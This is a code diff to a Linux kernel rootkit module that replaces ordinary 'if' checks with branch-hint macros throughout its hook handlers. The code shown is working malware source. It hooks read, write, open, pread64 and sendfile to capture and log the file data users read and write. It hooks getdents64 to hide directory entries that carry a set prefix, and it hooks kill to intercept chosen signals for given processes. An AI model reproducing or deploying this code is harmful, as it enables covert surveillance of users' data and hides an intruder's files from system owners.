@@ -30,7 +30,7 @@ static int __init rootkit_init(void)
     // Initialize hooking
     i_err = init_hooking();
 
-    if (i_err) {
+    IF_U (i_err) {
         pr_err("[ROOTKIT] Failed to initialize hooking\n");
         return i_err;
     }
@@ -65,7 +65,7 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
     pr_cont(" = %ld\n", l_ret);
 
     s_pathname = fd_get_pathname(ui32_fd);
-    if (IS_ERR_OR_NULL(s_pathname)) {
+    IF_U (IS_ERR_OR_NULL(s_pathname)) {
         s_pathname = kstrdup_const("(error)", GFP_KERNEL);
     }
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
@@ -73,12 +73,12 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
 
     s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
 
-    if (s_data == NULL) {
+    IF_U (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     } else {
         l_err = strncpy_from_user(s_data, s_buf, l_ret);
 
-        if (l_err < 0) {
+        IF_U (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
         } else {
             s_data[l_ret] = '\0';
@@ -106,7 +106,7 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
     pr_cont(" = %ld\n", l_ret);
 
     s_pathname = fd_get_pathname(ui32_fd);
-    if (IS_ERR_OR_NULL(s_pathname)) {
+    IF_U (IS_ERR_OR_NULL(s_pathname)) {
         s_pathname = kstrdup_const("(error)", GFP_KERNEL);
     }
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
@@ -114,12 +114,12 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
 
     s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
 
-    if (s_data == NULL) {
+    IF_U (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     } else {
         l_err = strncpy_from_user(s_data, s_buf, l_ret);
 
-        if (l_err < 0) {
+        IF_U (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
         } else {
             s_data[l_ret] = '\0';
@@ -143,7 +143,7 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
 
     s_filename_k = strndup_user(s_filename, PATH_MAX);
 
-    if (IS_ERR_OR_NULL(s_filename_k)) {
+    IF_U (IS_ERR_OR_NULL(s_filename_k)) {
         pr_err("[ROOTKIT] * Could not copy filename from user\n");
         // strncpy(s_filename_k, "(unknown)", PATH_MAX);
         s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
@@ -171,7 +171,7 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
     pr_cont(" = %ld\n", l_ret);
 
     s_pathname = fd_get_pathname(ui32_fd);
-    if (IS_ERR_OR_NULL(s_pathname)) {
+    IF_U (IS_ERR_OR_NULL(s_pathname)) {
         s_pathname = kstrdup_const("(error)", GFP_KERNEL);
     }
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
@@ -179,12 +179,12 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
 
     s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
 
-    if (s_data == NULL) {
+    IF_U (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     } else {
         l_err = strncpy_from_user(s_data, s_buf, l_ret);
 
-        if (l_err < 0) {
+        IF_U (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
         } else {
             s_data[l_ret] = '\0';
@@ -212,10 +212,10 @@ SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32
 
     s_pathname_in  = fd_get_pathname(i32_in_fd);
     s_pathname_out = fd_get_pathname(i32_out_fd);
-    if (IS_ERR_OR_NULL(s_pathname_in)) {
+    IF_U (IS_ERR_OR_NULL(s_pathname_in)) {
         s_pathname_in = kstrdup_const("(error)", GFP_KERNEL);
     }
-    if (IS_ERR_OR_NULL(s_pathname_out)) {
+    IF_U (IS_ERR_OR_NULL(s_pathname_out)) {
         s_pathname_out = kstrdup_const("(error)", GFP_KERNEL);
     }
     pr_info("[ROOTKIT] *  In file name: %s\n", s_pathname_in);
@@ -255,7 +255,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     pr_cont(" = %ld\n", l_ret_orig);
 
     s_pathname = fd_get_pathname(ui32_fd);
-    if (IS_ERR_OR_NULL(s_pathname)) {
+    IF_U (IS_ERR_OR_NULL(s_pathname)) {
         s_pathname = kstrdup_const("(error)", GFP_KERNEL);
     }
     pr_info("[ROOTKIT] * Directory name: %s\n", s_pathname);
@@ -263,7 +263,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
 
     if (l_ret_orig <= 0) {
         // No entries or error, return immediately
-        if (l_ret_orig == 0) {
+        IF_L (l_ret_orig == 0) {
             pr_info("[ROOTKIT] * No entries\n");
         } else {
             pr_err("[ROOTKIT] * Error: %ld\n", l_ret_orig);
@@ -273,7 +273,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
 
     p_dirent_k = (dirent64_t *)kzalloc(l_ret_orig, GFP_KERNEL);
 
-    if (p_dirent_k == NULL) {
+    IF_U (p_dirent_k == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
         return l_ret_orig;
     }
@@ -281,7 +281,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     // Copy data from user to kernel
     l_err = copy_from_user(p_dirent_k, p_dirent, l_ret_orig);
 
-    if (l_err != 0) {
+    IF_U (l_err != 0) {
         pr_err("[ROOTKIT] * Could not copy data from user\n");
         kfree(p_dirent_k);
         return l_ret_orig;
@@ -298,11 +298,10 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
         us_reclen = p_dirent_k_it->d_reclen;
 
         // Check if the current directory entry has to be hidden
-        if (!strncmp(p_dirent_k_it->d_name, S_HIDDEN_PREFIX, SZ_HIDDEN_PREFIX_LEN)) {
+        IF_U (!strncmp(p_dirent_k_it->d_name, S_HIDDEN_PREFIX, SZ_HIDDEN_PREFIX_LEN)) {
             pr_info("[ROOTKIT]     * Hiding directory entry\n");
 
-            // If this is the last directory entry, we have nothing special to do
-            if ((char *)p_dirent_k_it + us_reclen < (char *)p_dirent_k + l_ret) {
+            IF_L ((char *)p_dirent_k_it + us_reclen < (char *)p_dirent_k + l_ret) {
                 // The current directory entry is not the last one,
                 // so we have to move the next entries to the current position
                 l_move_len = l_ret - ((char *)p_dirent_k_it - (char *)p_dirent_k) - us_reclen;
@@ -320,10 +319,10 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     // Copy data back to user
     l_err = copy_to_user(p_dirent, p_dirent_k, l_ret);
 
-    if (l_err == 0) {
+    IF_L (l_err == 0) {
         // Erase the rest of the user buffer to avoid leaking data
         l_err = clear_user((char *)p_dirent + l_ret, l_ret_orig - l_ret);
-        if (l_err != 0) {
+        IF_U (l_err != 0) {
             pr_err("[ROOTKIT] * Could not clear user buffer\n");
         }
     } else {
@@ -355,8 +354,8 @@ SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
     pr_info("[ROOTKIT] kill(%d, %d)\n", i32_pid, i32_sig);
 
     for (i = 0; i < ARRAY_SIZE(p_sig_handlers); ++i) {
-        if ((p_sig_handlers[i].i32_pid < 0 || p_sig_handlers[i].i32_pid == i32_pid) &&
-            (p_sig_handlers[i].i32_sig < 0 || p_sig_handlers[i].i32_sig == i32_sig)) {
+        IF_U ((p_sig_handlers[i].i32_pid < 0 || p_sig_handlers[i].i32_pid == i32_pid) &&
+              (p_sig_handlers[i].i32_sig < 0 || p_sig_handlers[i].i32_sig == i32_sig)) {
             pr_info("[ROOTKIT] * Intercepting signal %d for PID %d\n", i32_sig, i32_pid);
             p_sig_handlers[i].sig_handler(i32_pid, i32_sig);
 
